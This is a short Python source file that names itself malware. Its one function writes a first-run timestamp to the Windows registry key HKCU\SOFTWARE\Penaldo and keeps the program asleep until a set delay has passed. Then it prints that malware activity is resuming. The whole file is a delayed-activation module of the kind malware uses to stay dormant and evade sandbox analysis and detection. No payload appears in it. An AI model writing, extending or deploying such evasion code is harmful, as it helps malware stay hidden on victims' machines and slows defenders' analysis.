import time
import winreg
from datetime import datetime, timedelta

registry_key_path = r"SOFTWARE\Penaldo"
registry_value_name = "StartupTimestamp"

def check_and_hibernate(days, hours, minutes, seconds, check_duration):
    """Hibernates the malware until the specified duration has passed since the first run."""
    sleep_duration = timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)

    def save_initial_timestamp():
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_key_path)
            timestamp_str = str(datetime.now())
            winreg.SetValueEx(key, registry_value_name, 0, winreg.REG_SZ, timestamp_str)
            winreg.CloseKey(key)
            print("First run: Timestamp saved in registry.")
        except Exception as e:
            print(f"Error saving timestamp to registry: {e}")

    def load_initial_timestamp():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key_path, 0, winreg.KEY_READ)
            timestamp_str, _ = winreg.QueryValueEx(key, registry_value_name)
            winreg.CloseKey(key)
            return datetime.fromisoformat(timestamp_str)
        except FileNotFoundError:
            return None
        except Exception as e:
            print(f"Error reading timestamp from registry: {e}")
            return None

    def check_time_elapsed():
        initial_timestamp = load_initial_timestamp()
        if not initial_timestamp:
            save_initial_timestamp()
            print("Hibernating.")
            return False

        current_time = datetime.now()
        time_elapsed = current_time - initial_timestamp
        if time_elapsed >= sleep_duration:
            print("Specified hibernation period has passed. Resuming malware activity.")
            return True
        else:
            remaining_time = sleep_duration - time_elapsed
            print(f"Hibernating. Time remaining until activation: {remaining_time}")
            return False

    while True:
        if check_time_elapsed():
            print("Malware is active.")
            break
        else:
            time.sleep(check_duration)